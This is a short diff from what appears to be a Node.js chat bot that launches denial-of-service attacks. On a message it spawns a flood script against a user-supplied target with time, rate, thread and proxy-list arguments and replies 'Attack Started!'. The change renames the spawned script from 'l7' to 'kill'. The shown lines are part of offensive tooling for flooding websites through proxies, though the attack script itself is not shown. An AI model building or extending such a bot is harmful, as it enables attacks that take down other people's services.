@@ -67,7 +67,7 @@ bot.on('message', (msg) => {
     }
 
     try {
-      const cmd = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt'])
+      const cmd = spawn('node', ['kill', target, time, rate, thread, 'proxy.txt'])
       const response = {
         status: "Attack Started!",
         target,
